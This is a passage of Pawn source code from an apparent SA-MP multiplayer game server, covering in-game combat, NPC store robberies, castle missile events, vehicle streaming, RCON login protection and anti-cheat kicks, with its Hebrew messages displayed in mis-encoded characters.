		for(new i = 0; i < 15; i++) if(playerinfo[playerid][srobj][i] != -1) if(objectinfo[playerinfo[playerid][srobj][i]][ovalid])
		{
			GetSObjectPos(playerinfo[playerid][srobj][i],p[0],p[1],p[2]);
			if(IsPlayerAimingAt(playerid,p[0],p[1],p[2],2.0)) if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) < dis) dis = GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]), toExp = playerinfo[playerid][srobj][i];
		}
		if(toExp != -1)
		{
			ExplosionEffect(playerid,1500,p[0],p[1],p[2]);
			GetSObjectPos(toExp,p[0],p[1],p[2]);
			MoveSObject(toExp,p[0],p[1],p[2]-5.0,3.5);
			PlaySound(playerid,1139,p[0],p[1],p[2]);
			objectinfo[toExp][odam] = 1;
			playerinfo[playerid][srscore]++;
			playerinfo[playerid][srobjs]--;
		}
	}
	new tl = GetPlayerTeleportArea(playerid);
	if(tl > -1 || specialActivity == sa_party || specialActivity == sa_sail)
	{
		if(tl > -1)
		{
			if(Teleports[tl][Tnoshooting] && !playerinfo[playerid][inhq])
			{
				StopPlayer(playerid);
				ResetWeapons(playerid);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рцф°ф",@c(red) "!рёх° ьщ°х· с∙щтх° цф","OK","");
			}
		}
		else if(specialActivity == sa_party && IsPlayerInRangeOfPoint(playerid,100.0,partytele[0],partytele[1],partytele[2]))
		{
			StopPlayer(playerid);
			ResetWeapons(playerid);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рцф°ф",@c(red) "!рёх° ьщ°х· сюёщсф","OK","");
		}
		else if(specialActivity == sa_sail && IsPlayerInRangeOfPoint(playerid,400.0,SailingShipRoutes[ssRoute][0],SailingShipRoutes[ssRoute][1],SailingShipRoutes[ssRoute][2]))
		{
			StopPlayer(playerid);
			ResetWeapons(playerid);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рцф°ф",@c(red) "!рёх° ьщ°х· с∙щщш","OK","");
		}
	}
	if((weaponid >= 22 && weaponid <= 34) || weaponid == 38)
	{
		new trg = GetPlayerTargetPlayer(playerid);
		if(IsPlayerConnected(trg))
		{
			if(IsPlayerNPC(trg) && playerinfo[trg][stoprob] > 0) SetPlayerHealth(trg,0.0);
		}
	}
	if((GetPlayerCheckpoint(playerid) == cp_bank || GetPlayerCheckpoint(playerid) == cp_ammu || GetPlayerCheckpoint(playerid) == cp_vstore) && playerinfo[playerid][spectate] == -1 && !IsPlayerMAdmin(playerid) && !playerinfo[playerid][srin])
	{
		SetPlayerHealth(playerid,0.0);
		SendClientMessage(playerid,red," !рёх° ь·ўхє рх ьрщщэ ыря");
	}
	if(playerinfo[playerid][streamedvehiclesmax] > 0)
	{
		new _i = GetPlayerWeapon(playerid);
		if(_i == 24 || _i == 30 || _i == 31 || _i == 33 || _i == 34) for(new i = 0, Float:p[7]; i < playerinfo[playerid][streamedvehiclesmax]; i++) if(playerinfo[playerid][streamedvehicles][i] != INVALID_VEHICLE_ID)
		{
			GetVehicleModelInfo(GetVehicleModel(playerinfo[playerid][streamedvehicles][i]),VEHICLE_MODEL_INFO_PETROLCAP,p[0],p[1],p[2]);
			GetVehiclePos(playerinfo[playerid][streamedvehicles][i],p[3],p[4],p[5]);
			GetVehicleZAngle(playerinfo[playerid][streamedvehicles][i],p[6]);
	        p[3] += (floatcos(p[6],degrees) * p[0]) - (floatsin(p[6],degrees) * p[1]);
	        p[4] += (floatsin(p[6],degrees) * p[0]) + (floatcos(p[6],degrees) * p[1]);
	        p[5] += p[2];
			if(IsPlayerAimingAt(playerid,p[3],p[4],p[5],0.15))
			{
				SetVehicleHealth(playerinfo[playerid][streamedvehicles][i],0.0);
				CreateExplosionVW(p[3],p[4],p[5],6,0.0,GetVehicleVirtualWorld(playerinfo[playerid][streamedvehicles][i]));
				break;
			}
		}
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && playerinfo[playerid][inhq] > 0 && Options[16][optActive])
	{
		new slot = GetWeaponSlot(weaponid);
		if(slot >= 2 && slot <= 9)
		{
			if(playerinfo[playerid][pShootTC][weaponid] > 0)
			{
				new time = -1;
				switch(weaponid) // Based on Mauzen's values
				{
					case 24: time = 550;
					case 25: time = 1000;
					case 27: time = 340;
					case 33, 34: time = 850;
				}
				if(time != -1 && GetTickCount()-playerinfo[playerid][pShootTC][weaponid] <= time) StopPlayer(playerid);
			}
			playerinfo[playerid][pShootTC][weaponid] = GetTickCount();
		}
	}
	if(weaponid == 24 && playerinfo[playerid][incbug][0])
	{
    	new amm = GetPlayerAmmo(playerid);
		if(amm == 6) playerinfo[playerid][incbug][2] = GetTickCount();
		else if(amm == 1) playerinfo[playerid][incbug][3] = 1;
 		else if(playerinfo[playerid][incbug][3])
		{
			new Float:avg = floatdiv(float(GetTickCount()-playerinfo[playerid][incbug][2]),1000.0), str[64];
			format(str,sizeof(str)," Х с∙Ёщщф: %.2f C-Bug ююхЎЄ щ°щх·",avg);
			SendClientMessage(playerid,lightblue,str);
			format(str,sizeof(str),"~b~c-bug test~n~~w~%.2f",avg);
			GameTextForPlayer(playerid,str,2500,5);
			if(playerinfo[playerid][bestcbug] == 0.0 || avg < playerinfo[playerid][bestcbug])
			{
				if(playerinfo[playerid][bestcbug] > 0.0)
				{
					format(str,sizeof(str)," Х цфх ∙щр чу∙! ф∙щр фўхуэ: %.2f || ф∙·Ї°· с: %.2f",playerinfo[playerid][bestcbug],playerinfo[playerid][bestcbug]-avg);
					SendClientMessage(playerid,grey,str);
				}
				playerinfo[playerid][bestcbug] = avg;
				if(playerinfo[playerid][logged]) fsetfloat(fuser(playerid),"BestCBug",playerinfo[playerid][bestcbug]);
			}
			playerinfo[playerid][incbug] = {0,0,0,0};
			SpawnPlayer(playerid);
		}
	}
	#if lagtest
		//LagTest_End("OnPlayerAttack");
	#endif
	return 1;
}
//=[OnPlayerWeaponSwitch]=======================================================
public OnPlayerWeaponSwitch(playerid, oldweapon, newweapon, spentammo)
{
	#if lagtest
		//LagTest_Start("OnPlayerWeaponSwitch");
	#endif
	if(playerinfo[playerid][spweapon] > 0 && spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] > 0 && spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] == newweapon) DefineSPWObject(playerid,playerinfo[playerid][spweapon],1);
	if(playerinfo[playerid][spweapon] > 0 && spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] > 0 && spAmmunation[playerinfo[playerid][spweapon]][spaWeapon] == oldweapon)
	{
		DefineSPWObject(playerid,playerinfo[playerid][spweapon],0);
		playerinfo[playerid][spwammo] -= spentammo;
		if(!playerinfo[playerid][spwammo])
		{
			if(playerinfo[playerid][logged] && spAmmunation[playerinfo[playerid][spweapon]][spaSaved]) fsetint(fuser(playerid),"SpecialWeapon",spw_none);
			playerinfo[playerid][spweapon] = spw_none;
		}
	}
	if(oldweapon == 26 && spentammo > 0 && spentammo <= 2) OnPlayerUsing22(playerid);
	//if(Options[9][optActive] && newweapon == 26 && playerinfo[playerid][using22] > 0) GiveWeapon(playerid,26,-2);
	#if lagtest
		//LagTest_End("OnPlayerWeaponSwitch");
	#endif
	return 1;
}
//=[OnPlayerUsing22]============================================================
public OnPlayerUsing22(playerid)
{
	playerinfo[playerid][using22]++;
	if(Options[9][optActive] || (playerinfo[playerid][ammuitems][ai_bugarmour] && playerinfo[playerid][bugarmour]))
	{
		StopPlayer(playerid);
		SetPlayerVelocity(playerid,0.0,0.0,0.5);
		if(playerinfo[playerid][ammuitems][ai_bugarmour] && playerinfo[playerid][bugarmour]) SendClientMessage(playerid,red," .ьюЄя ффтщЁх·: р·ф ю∙·ю∙ сютя сртщэ хыюх ∙ьр щыхьщэ ьЄ∙х· Єьщъ 2-2, тэ р·ф ьр щыхь ьЄ∙х· Єь рч°щэ");
	}
	return 1;
}
//=[OnPlayerTargetPlayer]=======================================================
public OnPlayerTargetPlayer(playerid,newtarget,oldtarget)
{
	#if lagtest
		LagTest_Start("OnPlayerTargetPlayer");
	#endif
	if(newtarget != INVALID_PLAYER_ID && IsPlayerConnected(newtarget))
	{
		new string[M_S], w = GetPlayerWeapon(playerid);
		if(playerinfo[newtarget][pinv] && !IsPlayerMAdmin(playerid)) if(!getAlpha(GetPlayerColor(newtarget)))
		{
			StopPlayer(playerid);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "рцф°ф",@c(darkred) "!∙щэ ьс\n\n" @c(red) ".рёх° ь·ўхє рующя ∙ЎсЄх ься - рующя с·Їўщу","OK","");
			SendClientMessage(newtarget, grey, " (∙чўя Ёщёф ьщ°х· съ хьр фЎьщч юыщххя ∙фщЁъ сюЎс рующя ься)");
		}
		if(IsPlayerNPC(newtarget) && w >= 22 && w <= 38)
		{
			new n = playerinfo[newtarget][selfnpc], st = -1, succ = 0, stname[32], stcmd[32];
			if(n == -1) Cheat(newtarget,"Bot",1);
			else
			{
				if(NPCs[n][npcParam] == np_rob && !NPCs[n][npcVehicle])
				{
					if(equal(NPCs[n][npcName],"DM_GamblingGuy"))
					{
						switch(random(3))
						{
							case 0: string = "ччч ф∙шхщх· фрьф ьр Єхсух· Єьщщ";
							case 1: string = "If you want to shoot,\nshoot, don't talk";
							case 2: string = ",р·ф рхьщ ф·сьсь·\nрЁщ ьр фюхы°· ючЁх· фчщх· ∙·хыь ьфЇчщу рх·щ";
						}
						SetPlayerChatBubble(newtarget,string,red,15.0,15000);
					}
					else
					{
						if(equal(NPCs[n][npcName],"DM_PhoneShop")) st = store_phones, stname = "чЁх· фЇьрЇхЁщэ", stcmd = "/PhoneShop";
						else if(equal(NPCs[n][npcName],"DM_PetShop")) st = store_pets, stname = "чЁх· фчщх·", stcmd = "/PetShop";
						else if(equal(NPCs[n][npcName],"DM_BombShop")) st = store_bombs, stname = "чЁх· фЇЎЎх·", stcmd = "/BombShop";
						if(!playerinfo[newtarget][robbed])
						{
							if(!random(10))
							{
								succ = 1;
								new mn = randomEx(3,8) * 75;
								GiveMoney(playerid,mn, 36);
								format(string,sizeof(string)," !фЎьч· ь∙уху р· %s хцыщ· с-$%d",stname,mn);
								SendClientMessage(playerid,green,string);
							}
							else
							{
								format(string,sizeof(string)," !ьр фЎьч· ь∙уху р· %s",stname);
								SendClientMessage(playerid,red,string);
							}
							playerinfo[newtarget][stoprob] = 30;
							switch(random(3 + (_:(st != store_bombs))))
							{
								case 0: SetPlayerChatBubble(newtarget,"!ьр! ссў∙ф",red,15.0,15000);
								case 1: SetPlayerChatBubble(newtarget,",ўч р· фыёє хьъ\n!ссў∙ф",red,15.0,15000);
								case 2: SetPlayerChatBubble(newtarget,"HELP ME!!",red,15.0,15000);
								case 3: SetPlayerChatBubble(newtarget,",ссў∙ф ьр\n!щ∙ ьщ щьущэ ссщ·",red,15.0,15000);
							}
							ApplyAnimation(newtarget,"PED","handsup",4.1,0,1,1,1,1);
							playerinfo[newtarget][robbed] = 600;
							SetWantedLevel(playerid,6,0);
							format(string,sizeof(string)," (%s) !Єь·ф ь-6, ыщ фхр Ёщёф ь∙уху р· %s %s %s °ю· фюсхў∙х· ∙ь",stcmd,stname,succ ? ("{00FF00}хфЎьщч{892EE4}") : ("{FF0000}хЁы∙ь{892EE4}"),GetName(playerid));
							News(string);
						}
						else
						{
							new already[32];
							switch(random(3))
							{
								case 0: already = "!ыс° ∙уух рх·щ";
								case 1: already = "ёьщчф. ыс° ∙уух рх·щ";
								case 2: already = "!ыс° Ё∙уу·щ";
							}
							format(talkBubble,sizeof(talkBubble),@c(red) "%s",already);
							NPCTalk(GetName(newtarget),already,playerid,1,1,-1);
						}
					}
				}
			}
		}
	}
	#if lagtest
		LagTest_End("OnPlayerTargetPlayer");
	#endif
	return 1;
}
//=[OnPlayerHealthChange]=======================================================
public OnPlayerHealthChange(playerid, Float:oldhealth, Float:newhealth)
{
	if(!playerinfo[playerid][dontac] && playerinfo[playerid][inact] && newhealth > oldhealth) if(!IsPlayerMAdmin(playerid))
	{
		OutOfActivity(playerid);
		new string[M_S];
		format(string,sizeof(string)," *** (°юрх·: фЄьр· чщщэ) %s фхЎр юфЇЄщьх· Єь щущ %s",botname,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
	}
	return 1;
}
//=[OnPlayerDoneCameraPath]=====================================================
public OnPlayerDoneCameraPath(playerid, path)
{
	switch(path)
	{
		case ipath_spawn:
		{
			SetCameraBehindPlayer(playerid);
			playerinfo[playerid][interpolating][1] = ipath_none;
		}
		case ipath_teleport:
		{
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			InterpolateCameraPos(playerid,playerinfo[playerid][teleportingp][0],playerinfo[playerid][teleportingp][1],playerinfo[playerid][teleportingp][2],p[0],p[1],p[2],1000,CAMERA_MOVE);
			playerinfo[playerid][interpolating][0] = 1, playerinfo[playerid][interpolating][1] = ipath_spawn;
		}
	}
	return 1;
}
//=[OnRconLoginAttempt]=========================================================
public OnRconLoginAttempt(ip[], password[], success)
{
	#if lagtest
		LagTest_Start("OnRconLoginAttempt");
	#endif
	new string[M_S], bool:inGame = false, playerid = INVALID_PLAYER_ID, ip_[16];
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
	{
		GetPlayerIp(i,ip_,sizeof(ip_));
		if(equal(ip_,ip))
		{
			inGame = true, playerid = i;
			break;
		}
	}
	print("--- " acname " RCON Protect: ---");
	if(success)
	{
		print(" Logged.");
		format(string,sizeof(string)," [login] %s: %s (pass: %s)",inGame ? ("In Game") : ("Remote Console"),ip,password);
		Log("Attention",inGame ? playerid : ConsoleID,string);
		AdminInfo(playerid,"ф·чс° ь°ўхя");
	}
	else
	{
		if(inGame)
		{
			playerinfo[playerid][rcontrys]++;
			format(string,sizeof(string)," .Ёр ьр ьЁёх· ьфыЁё ь°ўхя ∙ь ф∙°·. ы·хс· фрщщЇщ ∙ьъ (%s) хфыщЁхщ ∙ьъ Ё°∙юх сьхтщэ ∙ьЁх",ip);
			SendClientMessage(playerid,red,string);
			format(string,sizeof(string)," (рцф°ф %d ю·хъ 3)",playerinfo[playerid][rcontrys]);
			SendClientMessage(playerid,red,string);
			if(playerinfo[playerid][rcontrys] >= 3) SetBan(playerid,INVALID_PLAYER_ID,"Ёщёщхя Ї°щЎф ь°ўхя");
		}
		else
		{
			format(string,sizeof(string),"echo You FAIL! your IP (%s) written in our log and you'll be banned in a few seconds. BB! :)",ip);
			SendRconCommand(string);
		}
		format(string,sizeof(string),"(%s) Ёщёщхя ф·чс°х· ь°ўхя Ёы∙ь",ip);
		AdminInfo(playerid,string);
		format(string,sizeof(string)," [failed login] %s: %s, %s (pass: %s, try: %d/3)",inGame ? ("In Game") : ("Remote Console"),inGame ? (GetName(playerid)) : ("Console"),ip,password,playerinfo[playerid][rcontrys]);
		Log("Attention",ConsoleID,string);
	}
	#if lagtest
		LagTest_End("OnRconLoginAttempt");
	#endif
	return 1;
}
//=[OnPlayerStreamIn]===========================================================
public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}
//=[OnPlayerStreamOut]==========================================================
public OnPlayerStreamOut(playerid, forplayerid)
{
	#if lagtest
		LagTest_Start("OnPlayerStreamOut");
	#endif
	if(IsPlayerConnected(forplayerid)) if(GetPlayerState(forplayerid) == PLAYER_STATE_SPECTATING && playerinfo[forplayerid][spectate] == playerid)
	{
		TogglePlayerSpectating(forplayerid,1);
		PlayerSpectatePlayer(forplayerid,playerid);
		SetPlayerInterior(forplayerid,GetPlayerInterior(playerid));
	}
	#if lagtest
		LagTest_End("OnPlayerStreamOut");
	#endif
	return 1;
}
//=[OnVehicleStreamIn]==========================================================
public OnVehicleStreamIn(vehicleid, forplayerid)
{
	if(vehicleinfo[vehicleid][locked]) SetVehicleParamsForPlayer(vehicleid,forplayerid,0,1);
	new pl = -1;
	for(new i = 0; i < playerinfo[forplayerid][streamedvehiclesmax] && pl == -1; i++) if(playerinfo[forplayerid][streamedvehicles][i] == INVALID_VEHICLE_ID) pl = i;
	if(pl == -1 && playerinfo[forplayerid][streamedvehiclesmax] < MAX_STREAMED_VEHICLES) pl = playerinfo[forplayerid][streamedvehiclesmax];
	playerinfo[forplayerid][streamedvehicles][pl] = vehicleid;
	if(pl >= playerinfo[forplayerid][streamedvehiclesmax]) playerinfo[forplayerid][streamedvehiclesmax] = pl + 1;
	else
	{
		pl = -1;
		for(new i = playerinfo[forplayerid][streamedvehiclesmax]; i >= 0 && pl == -1; i--) if(playerinfo[forplayerid][streamedvehicles][i] != INVALID_VEHICLE_ID) playerinfo[forplayerid][streamedvehiclesmax] = (pl = i+1);
	}
	return 1;
}
//=[OnVehicleStreamOut]=========================================================
public OnVehicleStreamOut(vehicleid, forplayerid)
{
	new pl = -1;
	for(new i = 0; i < playerinfo[forplayerid][streamedvehiclesmax] && pl == -1; i++) if(playerinfo[forplayerid][streamedvehicles][i] == vehicleid) pl = i;
	if(pl != -1)
	{
		playerinfo[forplayerid][streamedvehicles][pl] = INVALID_VEHICLE_ID;
		new mx = 0;
		for(new i = pl; i < playerinfo[forplayerid][streamedvehiclesmax] && i < (MAX_STREAMED_VEHICLES-1); i++) playerinfo[forplayerid][streamedvehicles][i] = playerinfo[forplayerid][streamedvehicles][i + 1], mx = i;
		playerinfo[forplayerid][streamedvehiclesmax] = mx;
	}
	return 1;
}
//=[OnObjectMoved]==============================================================
public OnObjectMoved(objectid)
{
	if(debugstate) printf("OnObjectMoved(%d) start",objectid);
	#if lagtest
		//LagTest_Start("OnObjectMoved");
	#endif
	if(sportinfo[9] == objectid)
	{
		new Float:p[3];
		GetObjectPos(sportinfo[9],p[0],p[1],p[2]);
		if(p[0] < 1248.0 || p[0] > 1369.0 || p[1] < 2069.0 || p[1] > 2189.0) ReleaseSportParam();
		else if(p[2] >= 11.0 && p[2] < 12.0)
		{
			new gateTeam = 0;
			for(new i = 0; i <= 2; i += 2)
			{
				GetSObjectPos(sportobj[0],p[0],p[1],p[2]);
				if(ObjectToPoint(2.5,sportinfo[9],p[0],p[1],p[2])) gateTeam = sportinfo[!i ? 6 : 7];
			}
			if(playerinfo[sportinfo[8]][team] == gateTeam)
			{
				SportUpdate(5,sportinfo[8]);
				playerinfo[sportinfo[8]][sportscore]--;
			}
			else
			{
				SportUpdate(4,sportinfo[8]);
				playerinfo[sportinfo[8]][sportscore]++;
			}
		}
	}
	else if(objectid == ssObject[0] && specialActivity == sa_sail)
	{
		if(!random(3))
		{
			new Float:p[3];
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,400.0,SailingShipRoutes[ssRoute][0],SailingShipRoutes[ssRoute][1],SailingShipRoutes[ssRoute][2]))
			{
				GetPlayerPos(i,p[0],p[1],p[2]);
				PlaySound(i,6200,p[0],p[1],p[2]+floatrand(1.0,11.0));
			}
		}
		ssRoute++;
		if(ssRoute == sizeof(SailingShipRoutes)) EndSailingShip();
		else MoveObject(ssObject[0],SailingShipRoutes[ssRoute][0],SailingShipRoutes[ssRoute][1],SailingShipRoutes[ssRoute][2],9.0,SailingShipRoutes[ssRoute][3],SailingShipRoutes[ssRoute][4],SailingShipRoutes[ssRoute][5]);
	}
	#if lagtest
		//LagTest_End("OnObjectMoved");
	#endif
	if(debugstate) printf("OnObjectMoved(%d) end",objectid);
	return 1;
}
//=[OnDynamicObjectMoved]=======================================================
public OnDynamicObjectMoved(objectid)
{
	#if lagtest
		//LagTest_Start("OnDynamicObjectMoved");
	#endif
	// Castles
	for(new a = 0; a < MAX_CASTLES; a++) if(objectid == cainfo[a][caMissile][0])
	{
	    new c = cainfo[a][caMissileTo], string[M_S];
	    if(!cainfo[a][caMissileStep])
	    {
			MoveSObject(cainfo[a][caMissile][0],claninfo[c][chq][0],claninfo[c][chq][1],claninfo[c][chq][2]+50.0,20.0);
			MoveSObject(cainfo[a][caMissile][1],claninfo[c][chq][0]+3.0,claninfo[c][chq][1],claninfo[c][chq][2]+40.0,20.0);
			MoveSObject(cainfo[a][caMissile][2],claninfo[c][chq][0],claninfo[c][chq][1]+5.0,claninfo[c][chq][2]+55.0,20.0);
			MoveSObject(cainfo[a][caMissile][3],claninfo[c][chq][0]+5.0,claninfo[c][chq][1]+2.0,claninfo[c][chq][2]+60.0,20.0);
			cainfo[a][caMissileStep] = true;
		}
		else if(cainfo[a][caMissileStep])
		{
			for(new i = 0; i < 4; i++) DestroySObject(cainfo[a][caMissile][i]);
		    CreateExplosion(claninfo[c][chq][0]+random(50),claninfo[c][chq][1]+random(50),claninfo[c][chq][2],3,40.0);
		    CreateExplosion(claninfo[c][chq][0]-random(50),claninfo[c][chq][1]-random(50),claninfo[c][chq][2],3,40.0);
		    CreateExplosion(claninfo[c][chq][0]+random(50),claninfo[c][chq][1]+random(50),claninfo[c][chq][2],3,40.0);
		    CreateExplosion(claninfo[c][chq][0]-random(50),claninfo[c][chq][1]+random(50),claninfo[c][chq][2],3,40.0);
		    CreateExplosion(claninfo[c][chq][0]+random(50),claninfo[c][chq][1]-random(50),claninfo[c][chq][2],3,40.0);
		    CreateExplosion(claninfo[c][chq][0]+random(50),claninfo[c][chq][1]+random(50),claninfo[c][chq][2],3,40.0);
		    CreateExplosion(claninfo[c][chq][0]-random(50),claninfo[c][chq][1]-random(50),claninfo[c][chq][2],3,40.0);
		    CreateExplosion(claninfo[c][chq][0]+random(50),claninfo[c][chq][1]+random(50),claninfo[c][chq][2],3,40.0);
		    CreateExplosion(claninfo[c][chq][0]-random(50),claninfo[c][chq][1]-random(50),claninfo[c][chq][2],3,40.0);
		    for(new i = 0; i < sizeof(CastleMissilesInfo); i++) if(CastleMissilesInfo[i][cmCastle] == a) cainfo[a][caMissile][i] = CreateSObject(3786,CastleMissilesInfo[i][cmX],CastleMissilesInfo[i][cmY],CastleMissilesInfo[i][cmZ],CastleMissilesInfo[i][cmRotX],CastleMissilesInfo[i][cmRotY],CastleMissilesInfo[i][cmRotZ]);
   			format(string,sizeof(string),"~g~~h~Missiles landed headquarters ~n~~w~] ~r~~h~%s ~w~]",claninfo[c][cname]);
   			GameTextForAll(string,3000,4);
		    format(string,sizeof(string)," .{%s}%s " @c(brown) "фшщьщэ ∙∙хт°х ю%s Ёч·х сфЎьчф сюЇўу· фўьря",ClanHexColor(c),claninfo[c][cname],CastlesAreas[a][caName]);
			SendClientMessageToAll(brown,string);
		}
	}
	// Fireworks
	if(objectinfo[objectid][ocgod] > 0) SetTimerEx("ClanGodAttack",1750,0,"i",objectinfo[objectid][ocgod]);
	if(fireworks > 0) for(new i = 0; i < MAX_FIREWORKS; i++) if(firework[i] == objectid)
	{
		firework[i] = -1;
		break;
	}
	if(specialActivity == sa_party && objectid == partyobject[0]) partyobjectsMoved = 1;
	else if(objectid == partyobject[0] && partyobjectsMoved == 2)
	{
		for(new i = 0; i < MAX_PARTYOBJ; i++)
		{
			DestroySObject(partyobject[i]);
			partyobject[i] = 0;
		}
		partyobjects = 0, partyobjectsMoved = 0;
	}
	else if(objectinfo[objectid][omoving][0]) for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][hearinggate] == objectid && IsPlayerConnected(i))
	{
		PlaySound(i,1154);
		playerinfo[i][hearinggate] = -1;
	}
	CheckObjectParams(objectid);
	if(objectinfo[objectid][opaths] > 0)
	{
		if(!objectinfo[objectid][ovalid]) objectinfo[objectid][odonepaths] = objectinfo[objectid][opaths];
		else objectinfo[objectid][odonepaths]++;
		if(objectinfo[objectid][odonepaths] >= objectinfo[objectid][opaths])
		{
			objectinfo[objectid][opaths] = 0;
			objectinfo[objectid][odonepaths] = 0;
			StopSObject(objectid);
			if(funcidx(objectinfo[objectid][pathevent]) != -1) CallLocalFunction(objectinfo[objectid][pathevent],"ii",1,objectinfo[objectid][patheventparam]);
		}
		else
		{
			MoveSObject(objectid,objectinfo[objectid][opath][(objectinfo[objectid][odonepaths] * 4)],objectinfo[objectid][opath][(objectinfo[objectid][odonepaths] * 4)+1],objectinfo[objectid][opath][(objectinfo[objectid][odonepaths] * 4)+2],objectinfo[objectid][opath][(objectinfo[objectid][odonepaths] * 4)+3]);
			if(funcidx(objectinfo[objectid][pathevent]) != -1) CallLocalFunction(objectinfo[objectid][pathevent],"ii",0,objectinfo[objectid][patheventparam]);
		}
	}
	#if lagtest
		//LagTest_End("OnDynamicObjectMoved");
	#endif
	return 1;
}
//=[OnUnoccupiedVehicleUpdate]==================================================
public OnUnoccupiedVehicleUpdate(vehicleid,playerid,passenger_seat)
{
	/*if(vehicleinfo[vehicleid][store] && vehicleinfo[vehicleid][onlyview])
	{
		SendClientMessage(playerid,red," .рёх° ьтЄ· с°ыс цф! фхр ющхЄу ь·Ўхтф сьсу");
		SetVehicleToRespawn(vehicleid);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) SetPlayerForwardVelocity(playerid,-0.7,0.4);
		else
		{
			SetFreeze(playerid,1);
			SetTimerEx("UnFreeze",6000,0,"d",playerid);
		}
	} could be too laggy using IsPlayerInRangeOfPoint */
	return 1;
}
//=[OnPlayerClickMap]===========================================================
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	#if lagtest
		LagTest_Start("OnPlayerClickMap");
	#endif
	if(playerinfo[playerid][mapt])
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) SetVehiclePos(GetPlayerVehicleID(playerid),fX,fY,fZ);
		else SetPlayerPos(playerid,fX,fY,fZ);
	}
	if(playerinfo[playerid][selectingpos][0] == 2 && playerinfo[playerid][clan] > 0 && claninfo[playerinfo[playerid][clan]][cvalid]) DoneSelectingPos(playerid,fX,fY,fZ);
	#if lagtest
		LagTest_End("OnPlayerClickMap");
	#endif
	return 1;
}
//=[OnVehicleDamageStatusUpdate]================================================
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	if(vehicleinfo[vehicleid][vgm]) RepairVehicle(vehicleid);
	return 1;
}
//=[OnProgramResponse]==========================================================
public OnProgramResponse(clientid,response,data[]) // guard_shit
{
	new playerid = GetClientPlayerID(clientid);
	if(playerid != INVALID_PLAYER_ID && IsPlayerConnected(playerid) && IsPlayerUsingSGuard_(playerid))
	{
		switch(response)
		{
			case REQUEST_CHEATS: if(!strcmp(data,"True"))
			{
				SendClientMessage(playerid,red," .ф∙°· юцфф рЎьъ ∙щюх∙ сЎ'щшщэ рх фрўщэ хьыя ьр ·хыь ь∙чў");
				SendClientMessage(playerid,darkred," :рэ р·ф ьр сшхч юф т°э ьцф, Ёёф р· фрЇ∙°хщх· фсрх·");
				SendClientMessage(playerid,red," - Ўр юфю∙чў хьчї Єь ыЇ·х° \"фё°· Ў'щшщэ\" хрц Ёёф ьфыЁё ∙хс");
				SendClientMessage(playerid,red," - " webpage " ЇЁф рьщЁх сЇх°хэ ю∙хс хЄц°ф ср·°");
				SetKick(playerid,INVALID_PLAYER_ID,"sGuard цщфхщ Ў'щшщэ Єь щущ");
			}
			case REQUEST_CLEO: if(!strcmp(data,"True"))
			{
				SendClientMessage(playerid,red," .∙фхр юху рёх°, хьыя ьр ·хыь ь∙чў Cleo ф∙°· юцфф рЎьъ ∙щюх∙ сюху юёхт");
				SendClientMessage(playerid,darkred," :рэ р·ф ьр сшхч юф т°э ьцф, Ёёф р· фрЇ∙°хщх· фсрх·");
				SendClientMessage(playerid,red," - ыущ ьсшь р· фюху хрц Ёёф ьфыЁё ∙хс \"Cleo\" Ўр юфю∙чў хьчї Єь ыЇ·х°");
				SendClientMessage(playerid,red," - " webpage " ЇЁф рьщЁх сЇх°хэ ю∙хс хЄц°ф ср·°");
				SetKick(playerid,INVALID_PLAYER_ID,"sGuard цщфхщ юху ўьрх Єь щущ");
			}
		}
	}
}
//=[Contents]===================================================================
public Contents()
{
	if(debugstate) printf("Contents start");
	#if lagtest
		LagTest_Start("Contents");
	#endif
	serverUptime++;
	dbg(55,"1");
	new Float:h, Float:p[4], string[M_S], Float:z[2], Float:op[3], thetime[3], par = 0, par2 = 0, c = 0, moneyar[] = {1,1,1,2,2,3};
	gettime(thetime[0],thetime[1],thetime[2]);
	sta = {0,0}; // guard_shit
	lagstatus = GetTickCount();
	if(gameWantingIdle)
	{
		gameWantingIdle--;
		if(!gameWantingIdle) News("/games - ·хыьх ьсў∙ ЇЄщьх· рхшхюшщ· юЎхх· фрующЁщэ сЇўхуф");
	}
	// Castles
	for(new a = 0; a < MAX_CASTLES; a++)
	{
	    if(cainfo[a][caStartCapture] && cainfo[a][caCaptureTime] > 0)
	    {
			cainfo[a][caCaptureTime]--;
			if(cainfo[a][caCaptureTime] == 120 || cainfo[a][caCaptureTime] == 60 || cainfo[a][caCaptureTime] == 30)
			{
			    switch(cainfo[a][caCaptureTime])
			    {
			        case 30: format(string,sizeof(string),"╗ " @c(yellow) ".Ёх·°х Єху ∙ьх∙щэ ∙Ёщх· ьёщхэ фюьчюф Єь " @c(white) "%s" @c(yellow)"",CastlesAreas[a][caName]);
   			        case 60: format(string,sizeof(string),"╗ " @c(yellow) ".Ёх·°ф Єху уўф ьёщхэ фюьчюф Єь " @c(white) "%s" @c(yellow)"",CastlesAreas[a][caName]);
			        case 120: format(string,sizeof(string),"╗ " @c(yellow) ".Ёх·°х Єху ∙·щ уўх· ьёщхэ фюьчюф Єь " @c(white) "%s" @c(yellow)"",CastlesAreas[a][caName]);
			    }
			    SendClientMessageToAll(yellow,string);
			}
			if(!cainfo[a][caCaptureTime])
